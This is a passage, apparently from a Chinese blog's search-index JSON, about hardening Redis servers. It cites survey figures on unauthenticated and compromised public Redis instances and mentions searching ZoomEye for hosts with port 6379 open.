时候也能阻止一些脚本黑客的针对默认端口的批量扫描攻击。 影响网上公布了一组调查数据“针对 15 万台对公网开放的 Redis 服务器跟踪分析，发现有 15238 台未进行认证配置，也就是说超过10%的服务器可以直接连接；其中又有 10312 台服务器被入侵，总比例超过67%”。这个是我在 ZoomEye 上搜一下全网开放 6379 端口的主机，可以看到还是有不少的","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]}]}